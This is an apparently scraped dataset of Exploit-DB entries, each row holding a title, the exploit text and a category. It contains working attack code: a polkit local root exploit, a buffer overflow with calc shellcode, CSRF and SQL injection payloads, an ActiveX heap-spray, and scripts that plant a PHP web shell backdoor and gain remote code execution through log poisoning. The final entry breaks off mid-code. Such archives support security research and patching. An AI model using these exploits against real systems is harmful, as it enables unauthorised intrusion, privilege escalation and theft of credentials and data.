17932,"PolicyKit polkit-1 < 0.101 - Local Privilege Escalation /* polkit-pwnage.c  *  *  * ==============================  * =      PolicyKit Pwnage      =  * =          by zx2c4          =  * =        Sept 2, 2011        =  * ==============================  *  *  * Howdy folks,  *  * This exploits CVE-2011-1485, a race condition in PolicyKit.  *   * davidz25 explains:  *   * --begin--  * Briefly, the problem is that the UID for the parent process of pkexec(1) is  * read from /proc by stat(2)'ing /proc/PID. The problem with this is that  * this returns the effective uid of the process which can easily be set to 0  * by invoking a setuid-root binary such as /usr/bin/chsh in the parent  * process of pkexec(1). Instead we are really interested in the real-user-id.  * While there's a check in pkexec.c to avoid this problem (by comparing it to  * what we expect the uid to be - namely that of the pkexec.c process itself which  * is the uid of the parent process at pkexec-spawn-time), there is still a short  * window where an attacker can fool pkexec/polkitd into thinking that the parent  * process has uid 0 and is therefore authorized. It's pretty hard to hit this  * window - I actually don't know if it can be made to work in practice.  * --end--  *  * Well, here is, in fact, how it's made to work in practice. There is as he said an  * attempted mitigation, and the way to trigger that mitigation path is something  * like this:  *  *     $ sudo -u `whoami` pkexec sh  *     User of caller (0) does not match our uid (1000)  *  * Not what we want. So the trick is to execl to a suid at just the precise moment  * /proc/PID is being stat(2)'d. We use inotify to learn exactly when it's accessed,  * and execl to the suid binary as our very next instruction.  *  * ** Usage **  * $ pkexec --version  * pkexec version 0.101  * $ gcc polkit-pwnage.c -o pwnit  * $ ./pwnit   * [+] Configuring inotify for proper pid.  * [+] Launching pkexec.  * sh-4.2# whoami  * root  * sh-4.2# id  * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)  * sh-4.2#  *  * ** Targets **  * This exploit is known to work on polkit-1 <= 0.101. However, Ubuntu, which  * as of writing uses 0.101, has backported 0.102's bug fix. A way to check  * this is by looking at the mtime of /usr/bin/pkexec -- April 22, 2011 or  * later and you're out of luck. It's likely other distributions do the same.  * Fortunately, this exploit is clean enough that you can try it out without  * too much collateral.  *  *  * greets to djrbliss and davidz25.  *  * - zx2c4  * 2-sept-2011  *  */   #include <stdio.h> #include <stdlib.h> #include <errno.h> #include <unistd.h> #include <sys/types.h> #include <sys/inotify.h>  int main(int argc, char **argv) { 	printf(""=============================\n""); 	printf(""=      PolicyKit Pwnage     =\n""); 	printf(""=          by zx2c4         =\n""); 	printf(""=        Sept 2, 2011       =\n""); 	printf(""=============================\n\n"");  	if (fork()) { 		int fd; 		char pid_path[1024]; 		sprintf(pid_path, ""/proc/%i"", getpid()); 		printf(""[+] Configuring inotify for proper pid.\n""); 		close(0); close(1); close(2); 		fd = inotify_init(); 		if (fd < 0) 			perror(""[-] inotify_init""); 		inotify_add_watch(fd, pid_path, IN_ACCESS); 		read(fd, NULL, 0); 		execl(""/usr/bin/chsh"", ""chsh"", NULL); 	} else { 		sleep(1); 		printf(""[+] Launching pkexec.\n""); 		execl(""/usr/bin/pkexec"", ""pkexec"", ""/bin/sh"", NULL); 	} 	return 0; }",local,local,1
26658,"Orca Ringmaker 2.3 - 'Ringmaker.php' SQL Injection source: https://www.securityfocus.com/bid/15639/info  Orca Ringmaker is prone to an SQL injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.  Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.  Version 2.3c is vulnerable; other versions may also be affected.   http://www.example.com/ringmaker?start=[SQL]",remote,webapps,1
10081,"Palm Pre WebOS 1.1 - Remote File Access I. Description  The Palm Pre WebOS <=1.1 suffers from a JavaScript injection attack that allows a malicious attacker to access any file on the mobile device.  Palm has patched this vulnerability and all users are recommended to upgrade to WebOS version 1.2+.  Palm WebOS 1.2 patch information can be found here: http://kb.palm.com/wps/portal/kb/na/pre/p100eww/sprint/solutions/article /50607_en.html#12  II. Impact  A specially crafted email can access any file on the Palm Pre WebOS version <=1.1 mobile device and send it to a web site of the attacker's choice just by viewing the email.  III. Details  The Palm Pre WebOS 1.1 and lower will parse and execute JavaScript contained in an email it receives. Exploiting this vulnerability allows an attacker to read/extract any file and post it to a remote website the attacker controls.  One particular file of interest is the ""PalmDatabase.db3"" file. Having this database file will give an attacker emails, email addresses, contact list information including names, phone numbers, etc. Limitations with binary data have been identified, however viewing binary data such as database files is still simple.  Proof of Concept  Creating an email with the following JavaScript in it will automatically upload a file of the attacker's choice to a remote web server:  (Link provided instead of JS code )  http://tlhsecurity.com/advisories/FA_Code.jpg  To view a Flash demo of this exploit in action:  http://tlhsecurity.com/videos/FA.html  IV. About  This vulnerability was discovered by Townsend Ladd Harris <PalmPreHacker[at]gmail.com>  Vulnerability details will be maintained at http://tlhsecurity.blogspot.com/2009/10/palm-pre-webos-11-remote-file-ac cess.html  Special Thanks to : - Chris Rohlf - Blog: http://em386.blogspot.com/ - Destinal #webos-internals (irc.freenode.com) - Webos-Internals group #webos-internals (irc.freenode.com) http://www.webos-internals.org - Bryce Kerley - Dan Czarnecki - Jeremy Rasmussen",remote,remote,1
8520,"CoolPlayer Portable 2.19.1 - '.m3u' Local Buffer Overflow (2) #!/usr/bin/python #[*] Usage   : coolplayer.py #[*] Bug     : CoolPlayer Portable(m3u) Buffer Overflow exploit #[*] Founder : Gold_m #[*] First exploiter : stack ""he is my friend :)"" #[*] Tested on :    Xp sp2 (fr) #[*] Greetings :    All friends & muslims HaCkErs (DZ),snakespc.com,secdz.com  #[*] Note: I didn't know why the stack's exploit won't work for me but i founded that the junk data wasn't right in my case. #[*] and we have to expand the nops to pass the null byte. #[*] it worked for me from the beginning.  # win32_exec -  EXITFUNC=seh CMD=calc Size=160 Encoder=PexFnstenvSub http://metasploit.com shellcode=( ""\x31\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x79"" ""\xe4\x94\xba\x83\xeb\xfc\xe2\xf4\x85\x0c\xd0\xba\x79\xe4\x1f\xff"" ""\x45\x6f\xe8\xbf\x01\xe5\x7b\x31\x36\xfc\x1f\xe5\x59\xe5\x7f\xf3"" ""\xf2\xd0\x1f\xbb\x97\xd5\x54\x23\xd5\x60\x54\xce\x7e\x25\x5e\xb7"" ""\x78\x26\x7f\x4e\x42\xb0\xb0\xbe\x0c\x01\x1f\xe5\x5d\xe5\x7f\xdc"" ""\xf2\xe8\xdf\x31\x26\xf8\x95\x51\xf2\xf8\x1f\xbb\x92\x6d\xc8\x9e"" ""\x7d\x27\xa5\x7a\x1d\x6f\xd4\x8a\xfc\x24\xec\xb6\xf2\xa4\x98\x31"" ""\x09\xf8\x39\x31\x11\xec\x7f\xb3\xf2\x64\x24\xba\x79\xe4\x1f\xd2"" ""\x45\xbb\xa5\x4c\x19\xb2\x1d\x42\xfa\x24\xef\xea\x11\x14\x1e\xbe"" ""\x26\x8c\x0c\x44\xf3\xea\xc3\x45\x9e\x87\xf5\xd6\x1a\xe4\x94\xba"")  exploit = ""\x41""*220 + ""\x5D\x38\x82\x7C"" + ""\x90""*122 + shellcode  try:     out_file = open(""exploit.m3u"",'w')     out_file.write(exploit)     out_file.close()     print ""Exploit file created!\n"" except:     print ""Error""  # milw0rm.com [2009-04-22]",local,local,1
15970,"Cambio 0.5a - Cross-Site Request Forgery Vulnerability ID: HTB22768 Reference: http://www.htbridge.ch/advisory/xsrf_csrf_in_cambio.html Product: Cambio Vendor: Joram van den Boezem ( http://www.cambiocms.org/ )  Vulnerable Version: 0.5a nightly r37 and probably prior versions Vendor Notification: 28 December 2010  Vulnerability Type: CSRF (Cross-Site Request Forgery) Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response Risk level: Low  Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)   Vulnerability Details: The vulnerability exists due to failure in the ""modules/user/user.admin.php"" script to properly verify the source of HTTP request.  Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.  Attacker can use browser to exploit this vulnerability. The following PoC is available:  <form action=""http://host/admin/index.php?module=user&task=save&elmid="" method=""post"" name=""main""> <input type=""hidden"" name=""id"" value=""USERID""> <input type=""hidden"" name=""module"" value=""100""> <input type=""hidden"" name=""newpass1"" value=""newpass""> <input type=""hidden"" name=""newpass2"" value=""newpass""> <input type=""hidden"" name=""email"" value=""email@example.com""> <input type=""hidden"" name=""usertype_id"" value=""2""> </form> <script> document.main.submit(); </script>",remote,webapps,1
5208,"phpArcadeScript 3.0RC2 - 'userid' SQL Injection ############################################################################ # phpArcadeScript (all version) Remote Sql Injection Exploit               # #                                                                          # # AUTHOR:SoSo H H (Iraqi-Cracker)                                          # #                                                                          # # Script Site: http://www.phparcadescript.com/                             # #                                                                          # # Price:$30.00                                                             # #                                                                          # # Tested on: Versions:1.0,2.0,3.0 RC1 &RC2                                 # #                                                                          # # Dorks:""Powered by phpArcadeScript v1.0""                                  # #       ""Powered by phpArcadeScript v2.0""                                  # #       ""Powered by phpArcadeScript v3.0RC1""                               # #       ""Powered by phpArcadeScript v3.0RC2""                               # ############################################################################ # Exploit in:                                                              # # index.php?action=profile&userid=(SQL)                                    # #                                                                          # # Example:                                                                 # #                                                                          # # (SQL)=1+union+all+select+1,concat(username,0x3a,password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23+from+users/*# ############################################################################ # Greetz:                                                                  # # L!0N,El Mariachi,My Sweet,Shadow Administrator,-=Miz0=-,Iraqi-KoRn       # # Mini.Spider,and All 7shasha Boards Members!                              # ############################################################################    # milw0rm.com [2008-03-01]",remote,webapps,1
41433,"ProjectSend r754 - Insecure Direct Object Reference Document Title: =============== ProjectSend r754 - IDOR & Authentication Bypass Vulnerability   References (Source): ==================== https://www.vulnerability-lab.com/get_content.php?id=2031   Release Date: ============= 2017-02-21   Vulnerability Laboratory ID (VL-ID): ==================================== 2031   Common Vulnerability Scoring System: ==================================== 5.3   Product & Service Introduction: =============================== ProjectSend is a self-hosted application (you can install it easily on your own VPS or shared web hosting account) that lets  you upload files and assign them to specific clients that you create yourself! Secure, private and easy. No more depending  on external services or e-mail to send those files.  (Copy of the Homepage: http://www.projectsend.org/ )   Abstract Advisory Information: ============================== The vulnerability laboratory core research team discovered a idor and authentication bypass vulnerability in the ProjectSend-r754 web-application.   Vulnerability Disclosure Timeline: ================================== 2017-02-20: Public Disclosure (Vulnerability Laboratory)   Discovery Status: ================= Published   Affected Product(s): ==================== GNU GPL License Product: ProjectSend r754   Exploitation Technique: ======================= Remote   Severity Level: =============== Medium   Technical Details & Description: ================================ An insecure direct object references occured in case of an application provides direct access to objects based on user-supplied input.  As a result of this vulnerability attackers can bypass authorization and to access resources in the system. Insecure Direct Object References  allows attackers to bypass authorization and access resources directly by modifying the value of a parameter[client] used. Thus finally point  to other client account names, which allows an attackers to download others clients private data with no secure method provided.  Vulnerability Method(s): [+] GET  Vulnerable Module(s): [+] process.php?do=zip_download  Vulnerable Parameter(s): [+] client [+] file   Proof of Concept (PoC): ======================= The security vulnerability can be exploited by remote attackers with low privilege web-application user account and low user interaction. For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.  1. User ""A"" as attacker checks a file to download as zip extension, then click download to modifiy values as required ...  2. Application responds with the client file list, so then you are able to download all other side user B data files with zip extension    --- PoC Session Logs --- GET /ProjectSend-r754/process.php?do=zip_download&client=[CLIENTNAME]&files%5B%5D=2 HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux i686; rv:50.0) Gecko/20100101 Firefox/50.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate X-Requested-With: XMLHttpRequest Referer: http://localhost/ProjectSend-r754/my_files/ Cookie: PHPSESSID=kb0uotq6mssklf213v4a7fje47 Connection: keep-alive - HTTP/1.1 200 OK Date: Sun, 05 Feb 2017 19:07:41 GMT Server: Apache/2.2.22 (Debian) X-Powered-By: PHP/5.4.44-0+deb7u1 Expires: Sat, 26 Jul 1997 05:00:00 GMT Cache-Control: no-store, no-cache, must-revalidate, max-age=0 Pragma: no-cache Vary: Accept-Encoding Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html Content-Length: 6  Name of Files: .jpg   Video PoC: https://www.youtube.com/watch?v=Xc6Jg9I7Pj4   Security Risk: ============== The security risk of the web vulnerability in the ProjectSend-r754 web-application function is estimated as medium. (CVSS 5.3)   Credits & Authors: ================== Lawrence Amer - Vulnerability Laboratory [Research Team] - (http://lawrenceamer.me) (https://www.vulnerability-lab.com/show.php?user=Lawrence Amer)   Disclaimer & Information: ========================= The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed  or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable  in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab  or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability mainly for  consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any licenses, policies,  deface websites, hack into databases or trade with stolen data.  Domains:    www.vulnerability-lab.com 		- www.vuln-lab.com 						- www.evolution-sec.com Section:    magazine.vulnerability-lab.com 	- vulnerability-lab.com/contact.php 				- evolution-sec.com/contact Social:	    twitter.com/vuln_lab		- facebook.com/VulnerabilityLab 				- youtube.com/user/vulnerability0lab Feeds:	    vulnerability-lab.com/rss/rss.php 	- vulnerability-lab.com/rss/rss_upcoming.php 			- vulnerability-lab.com/rss/rss_news.php Programs:   vulnerability-lab.com/submit.php 	- vulnerability-lab.com/list-of-bug-bounty-programs.php 	- vulnerability-lab.com/register.php  Any modified copy or reproduction, including partially usages, of this file, resources or information requires authorization from Vulnerability Laboratory.  Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by  Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website is trademark  of vulnerability-lab team & the specific authors or managers. To record, list, modify, use or edit our material contact (admin@) to get a ask permission.  				    Copyright © 2017 | Vulnerability Laboratory - [Evolution Security GmbH]™",remote,webapps,1
17562,"ExtCalendar2 - Cookie Authentication Bypass / Backdoor Upload <? if(!$argv[1]) die(""  Usage   : php exploit.php [site] Example : php exploit.php http://site.tld/calendar/  ""); print_r(""  # Exploit....: [ ExtCalendar2 (Auth Bypass/Cookie) SQL Injection ] # Author.....: [ Lagripe-Dz ] # Date.......: [ 05-o6-2o11 ] # Twitter ...: [ @Lagripe_Dz ] # HoMe ......: [ Sec4Ever.com & Lagripe-Dz.org ] # Download ..: [ http://sourceforge.net/projects/extcal/ ] # Video .....: [ http://www.youtube.com/watch?v=2aatog92oqU ]                        -==[ ExPloiT ]==- 					   javascript:document.cookie=\""ext20_username=admin ' or '1'= '1\""; javascript:document.cookie=\""ext20_password=admin ' or '1'= '1\"";                         -==[ Start ]==-  "");  $target = $argv[1];  if(!extension_loaded(""curl"")){ die(""error::cURL extension required""); }  # first get cookie prefix from page source ( xxx_username by default > ext20_username ) preg_match_all('#extcal_cookie_id = ""(.*)""#', DzCURL($target,0,0) , $prf); $prefix = $prf[1][0];  # header .. $header[] = ""Cookie: "".$prefix.""_username=admin ' or '1'= '1; "".$prefix.""_password=admin ' or '1'= '1;"";  # check if it's work by looking for [ logout ] echo (eregi(""logout"", DzCURL($target,0,$header))) ? ""# Login :D\n"":die(""# Failed : Can't Login"");  # data of new settings with allowed php extension  $new_settings = Array(     ""calendar_name"" => ""Calendar name"",""calendar_description"" => ""Calendar description"",     ""calendar_admin_email"" => ""Calendar Administrator email"",""cookie_name"" => ""ext20"",     ""cookie_path"" => ""/"",""debug_mode"" => 1,""calendar_status"" => 1,""lang"" => ""english"",     ""charset"" => ""language-file"",""theme"" => ""default"",""timezone"" => 1,""time_format_24hours"" => 1,     ""auto_daylight_saving"" => 1,""main_table_width"" => ""50%"",""day_start"" => 1,""default_view"" => 1,     ""search_view"" => 1,""archive"" => 1,""events_per_page"" => 5,""sort_order"" => ""ta"",     ""show_recurrent_events"" => 1,""multi_day_events"" => ""all"",""legend_cat_columns"" => 5,     ""allow_user_registration"" => 1,""reg_duplicate_emails"" => 1,""reg_email_verify"" => 1,     ""popup_event_mode"" => 1,""popup_event_width"" => 1,""popup_event_height"" => 1,     ""add_event_view"" => 1,""addevent_allow_html"" => 1,""addevent_allow_contact"" => 1,     ""addevent_allow_email"" => 1,""addevent_allow_url"" => 1,""addevent_allow_picture"" => 1,     ""new_post_notification"" => 1,""monthly_view"" => 1,""cal_view_show_week"" => 1,     ""cal_view_max_chars"" => 100,""flyer_view"" => 1,""flyer_show_picture"" => 1,     ""flyer_view_max_chars"" => 100,""weekly_view"" => 1,""weekly_view_max_chars"" => 100,     ""daily_view"" => 1,""daily_view_max_chars"" => 100,""cats_view"" => 1,""cats_view_max_chars"" => 100,     ""mini_cal_def_picture"" => 1,""mini_cal_diplay_options"" => ""default"",""mail_method"" => ""smtp"",     ""mail_smtp_host"" => 0,""mail_smtp_auth"" => 1,""mail_smtp_username"" => 0,""mail_smtp_password"" => 0,     ""max_upl_dim"" => 99999999999999999,""max_upl_size"" => 99999999999999999,""picture_chmod"" => 755,     ""allowed_file_extensions"" => ""PHP/PY/PERL/HTACCESS/ASP/ASPX"",""update_config"" => ""Save New Configuration""); 	 # post data and check if settings updated and php added echo (eregi(""<strong>.*</strong>"", DzCURL($target.""admin_settings.php"",$new_settings,$header))) ? ""# Settings Updated :D\n"":die(""# Failed : can't update settings"");  # get event id for connect 2 backdoor $events = DzCURL($target.""admin_events.php?eventfilter=0"",0,$header); preg_match_all('#edit&id=(:?[0-9]+)#' ,$events ,$r );  # backdoor xD  $bd = ""<? echo Exe(base64_decode(\$_GET[dz])); function Exe(\$command) { 	if(function_exists('passthru')){\$exec = passthru(\$command);} 	elseif(function_exists('system') && !\$exec){\$exec= system(\$command); } 	elseif(function_exists('exec') && !\$exec){exec(\$command,\$output);\$exec=join(\""\n\"",\$output);} 	elseif(function_exists('shell_exec') && !\$exec){\$exec=shell_exec(\$command);} 	elseif(function_exists('popen') && !\$exec){\$fp = popen(\$command,\""r\""); 	{while(!feof(\$fp)){\$result.=fread(\$fp,1024);}pclose(\$fp);}\$exec = convert_cyr_string(\$result,\""d\"",\""w\"");} 	elseif(function_exists('win_shell_execute') && !\$exec){\$exec = winshell(\$command);} 	elseif(function_exists('win32_create_service') && !\$exec){\$exec=srvshell(\$command);} 	elseif(extension_loaded('ffi') && !\$exec){\$exec=ffishell(\$command);} 	elseif(extension_loaded('perl') && !\$exec){\$exec=perlshell(\$command);} 	elseif(!\$exec) {\$exec = slashBypass(\$command);} 	elseif(!\$exec && extension_loaded('python')) 	{\$exec = python_eval(\""import os 	pwd = os.getcwd() 	print pwd 	os.system('\"".\$command.\""')\"");} 	elseif(\$exec){return \$exec;} } ?>""; # make bd file_put_contents(""dz.php"",$bd);  # new event with php backdoor $post_bd = array(    ""mode""=>""edit"",""id""=>$r[1][0],""title""=>""blabla"",     ""description""=>""bla bla bla ,,,"",""cat""=> 1,     ""day""=> 22,""month""=> 11,""year""=>2011,     ""picture""=>""@"".realpath(""dz.php""),     ""submit""=>""  Update Event  "");  # post backdoor & check echo (!eregi(""<strong>Errors</strong>"", DzCURL($target.""admin_events.php"",$post_bd,$header))) ? ""# Backdoor uploaded :D\n"":die(""# Failed : can't upload Backdoor"");  @unlink(""dz.php""); # del backdoor after uploading  # looking for backdoor preg_match_all('#upload/(:?[a-z0-9]+)_dz.php#' ,DzCURL($target.""admin_events.php?mode=view&id="".$r[1][0],0,$header) ,$r2 );  echo (!$r2[0][0]) ? die(""# Failed : Backdoor not found !""):"""";  # connecting with backdoor :P while(1) {         fwrite(STDOUT, ""\ncmd~# ""); 		// (trim((fgets(STDIN))) == ""exit"") ? exit:""""; // exit from loop         $cmd = base64_encode(trim((fgets(STDIN)))); 	echo DzCURL($target.$r2[0][0].""?dz="".$cmd ,0,0);     }  # function ...      function DzCURL($url,$posts ,$header){  $curl=curl_init(); curl_setopt($curl,CURLOPT_RETURNTRANSFER,1); if(is_array($header)){ curl_setopt($curl, CURLOPT_HTTPHEADER, $header);  } curl_setopt($curl,CURLOPT_URL,$url); curl_setopt($curl,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 5.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 DzCURL =)'); curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1); if(is_array($posts)){ curl_setopt($curl,CURLOPT_POST,1); curl_setopt($curl,CURLOPT_POSTFIELDS,$posts); } curl_setopt($curl,CURLOPT_TIMEOUT,5);  $exec=curl_exec($curl); curl_close($curl); return $exec; } # _EOF ?>",remote,webapps,1
26513,PHPWCMS 1.2.5 -DEV - 'imgdir' Traversal Arbitrary File Access source: https://www.securityfocus.com/bid/15436/info   phpWCMS is prone to multiple remote file-include vulnerabilities because the application fails to properly sanitize user-supplied input.   An attacker may leverage these issues to obtain sensitive information that may help with further attacks on the affected computer.   http://www.example.com/phpwcms/img/random_image.php?imgdir=../../../etc/,remote,webapps,1
17328,"Magneto ICMP ActiveX 4.0.0.20 - ICMPSendEchoRequest Remote Code Execute Magneto ICMP ActiveX v4.0.0.20 ICMPSendEchoRequest Remote Code Execute Date: 2011-5-27 Discovered by: boahat vendor: 	http://www.magnetosoft.com/ Download: http://www.magnetosoft.com/downloads/skicmp_setup.exe   SKIcmp.ocx  Function ICMPSendEchoRequest (  	ByVal bstrDestinationAddress  As String  )  As Long  .text:1000F012                 mov     edx, [ebx+8]	// edx can be control .text:1000F015                 lea     ecx, [esp+468h+String1] .text:1000F019                 push    esi .text:1000F01A                 push    ecx .text:1000F01B                 call    edx		// bomb...  [POC]  <html> <body> <object classid=""clsid:3A86F1F2-4921-4C75-AF2C-A1AA241E12BA"" id=""target""></object> <script>     var shellcode = unescape(""%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB01%u1C8B%u018B%u89EB%u245C%uC304%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%u7E68%uE2D8%u6873%uFE98%u0E8A%uFF57%u63E7%u6C61%u0063"");      var bigblock  = unescape(""%u0c0c%u0c0c"");     var headersize = 20;     var slackspace = headersize+shellcode.length;     while (bigblock.length<slackspace)         bigblock+=bigblock;            fillblock = bigblock.substring(0, slackspace);     block = bigblock.substring(0, bigblock.length-slackspace);     while(block.length+slackspace<0x40000)         block = block+block+fillblock;        memory = new Array();     for (x=0; x<500; x++)         memory[x] = block + shellcode; 		     var buffer = '';	     while (buffer.length < 6000)         buffer+=""\x0c\x0c\x0c\x0c"";     target.ICMPSendEchoRequest(buffer); </script> </body> </html>   # Exploit-DB Note: # According to MagnetSoft The exploit has been fixed in the latest version of the software,5.0.0.1. # The latest version that contains the fix can be downloaded here: # http://www.magnetosoft.com/www/downloads/win32/skdns_setup.exe",remote,remote,1
4081,"Jasmine CMS 1.0 - SQL Injection / Remote Code Execution #!/usr/bin/php -q -d short_open_tag=on <?php  error_reporting(0); ini_set(""max_execution_time"",0); ini_set(""default_socket_timeout"",5);  if ($argc<4) { print ""-------------------------------------------------------------------------\r\n""; print ""        Jasmine CMS 1.0 SQL Injection/Remote Code Execution Exploit\r\n""; print ""-------------------------------------------------------------------------\r\n""; print ""Usage: w4ck1ng_jasmine.php [OPTION] [HOST] [PATH] ([COMMAND])\r\n\r\n""; print ""[OPTION]  = 0 = Remote Code Execution\r\n""; print ""            1 = SQL Injection (Admin user & hash retrieval)\r\n""; print ""[HOST] 	  = Target server's hostname or ip address\r\n""; print ""[PATH] 	  = Path where Jasmine is located\r\n""; print ""[COMMAND] = Command to execute\r\n\r\n""; print ""e.g. w4ck1ng_jasmine.php 0 victim.com /jasmine/ \""ls -lia\""\r\n""; print ""     w4ck1ng_jasmine.php 1 victim.com /jasmine/\r\n""; print ""-------------------------------------------------------------------------\r\n""; print ""            		 http://www.w4ck1ng.com\r\n""; print ""            		        ...Silentz\r\n""; print ""-------------------------------------------------------------------------\r\n""; die; }  //Props to rgod for the following functions  $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)'; function sendpacketii($packet) {   global $proxy, $host, $port, $html, $proxy_regex;   if ($proxy=='') {     $ock=fsockopen(gethostbyname($host),$port);     if (!$ock) {       echo 'No response from '.$host.':'.$port; die;     }   }   else { 	$c = preg_match($proxy_regex,$proxy);     if (!$c) {       echo 'Not a valid proxy...';die;     }     $parts=explode(':',$proxy);     echo ""Connecting to "".$parts[0]."":"".$parts[1]."" proxy...\r\n"";     $ock=fsockopen($parts[0],$parts[1]);     if (!$ock) {       echo 'No response from proxy...';die; 	}   }   fputs($ock,$packet);   if ($proxy=='') {     $html='';     while (!feof($ock)) {       $html.=fgets($ock);     }   }   else {     $html='';     while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {       $html.=fread($ock,1);     }   }   fclose($ock); }  function make_seed() {    list($usec, $sec) = explode(' ', microtime());    return (float) $sec + ((float) $usec * 100000); }  $exploit = $argv[1]; $host = $argv[2]; $path = $argv[3]; $cmd  = $argv[4]; $cmd  = urlencode($cmd); $port=80; $proxy="""";  if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;} if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}  function head(){  	print ""-------------------------------------------------------------------------\r\n""; 	print ""        Jasmine CMS 1.0 SQL Injection/Remote Code Execution Exploit\r\n""; 	print ""-------------------------------------------------------------------------\r\n""; }  function footer(){  	print ""-------------------------------------------------------------------------\r\n""; 	print ""            		 http://www.w4ck1ng.com\r\n""; 	print ""            		        ...Silentz\r\n""; 	print ""-------------------------------------------------------------------------\r\n""; }   if ($exploit==0){  head();  $code=""<?php echo w4ckw4ck;error_reporting(0);set_time_limit(0);if (get_magic_quotes_gpc()){\$_GET[cmd]=stripslashes(\$_GET[cmd]);}passthru(\$_GET[cmd]);die;?>""; $packet=""GET "" . $p . $code . "" HTTP/1.0\r\n""; $packet.=""User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n""; $packet.=""Host: "" . $host . ""\r\n""; $packet.=""Connection: close\r\n\r\n""; sendpacketii($packet);  $sql = ""' UNION SELECT id,username,email,signature,avatar_path,joined,total_visits,status FROM user WHERE id = '1'/*"";  $data=""login_username="" . $sql; $data.=""&login_password=""; $data.=""login=Login""; $packet =""POST "" . $path . ""login.php HTTP/1.1\r\n""; $packet.=""Content-Type: application/x-www-form-urlencoded\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""User-Agent: Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727;)\r\n""; $packet.=""Content-Length: "".strlen($data).""\r\n""; $packet.=""Connection: Close\r\n\r\n""; $packet.=$data; sendpacketii($packet);  if (strstr($html,""302 Found"")){} else{print ""[-] Exploit Failed...\r\n""; footer(); exit();} $temp=explode(""Set-Cookie: "",$html); $temp2=explode("" "",$temp[1]); $cookie=$temp2[0];  $paths= array ( ""../../../../../var/log/httpd/access_log"", ""../../../../../var/log/httpd/error_log"", ""../apache/logs/error.log"", ""../apache/logs/access.log"", ""../../apache/logs/error.log"", ""../../apache/logs/access.log"", ""../../../apache/logs/error.log"", ""../../../apache/logs/access.log"", ""../../../../apache/logs/error.log"", ""../../../../apache/logs/access.log"", ""../../../../../apache/logs/error.log"", ""../../../../../apache/logs/access.log"", ""../logs/error.log"", ""../logs/access.log"", ""../../logs/error.log"", ""../../logs/access.log"", ""../../../logs/error.log"", ""../../../logs/access.log"", ""../../../../logs/error.log"", ""../../../../logs/access.log"", ""../../../../../logs/error.log"", ""../../../../../logs/access.log"", ""../../../../../etc/httpd/logs/access_log"", ""../../../../../etc/httpd/logs/access.log"", ""../../../../../etc/httpd/logs/error_log"", ""../../../../../etc/httpd/logs/error.log"", ""../../../../../var/www/logs/access_log"", ""../../../../../var/www/logs/access.log"", ""../../../../../usr/local/apache/logs/access_log"", ""../../../../../usr/local/apache/logs/access.log"", ""../../../../../var/log/apache/access_log"", ""../../../../../var/log/apache/access.log"", ""../../../../../var/log/access_log"", ""../../../../../var/www/logs/error_log"", ""../../../../../var/www/logs/error.log"", ""../../../../../usr/local/apache/logs/error_log"", ""../../../../../usr/local/apache/logs/error.log"", ""../../../../../var/log/apache/error_log"", ""../../../../../var/log/apache/error.log"", ""../../../../../var/log/access_log"", ""../../../../../var/log/error_log"" );  for ($i=0; $i<=count($paths)-1; $i++) { $a=$i+2;  $packet =""GET "" . $path . ""admin/plugin_manager.php?u="" . $paths[$i] . ""%00&cmd="" . $cmd . "" HTTP/1.1\r\n""; $packet.=""Host: "" . $host . ""\r\n"";  $packet.=""Cookie: "" . $cookie . ""\r\n""; $packet.=""Connection: Close\r\n\r\n"";  sendpacketii($packet);  if (strstr($html,""w4ckw4ck""))     {      $temp=explode(""w4ckw4ck"",$html);         print $temp[1];         footer(); exit;     }   } }  if($exploit==1){      $sql = ""news.php?item=-999/**/UNION/**/SELECT/**/0,password,0,0,0,0,username/**/FROM/**/user/**/WHERE/**/id=1/*"";     $packet =""GET "" . $path . $sql . "" HTTP/1.1\r\n"";     $packet.=""Host: "" . $host . ""\r\n"";     $packet.=""User-Agent: Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 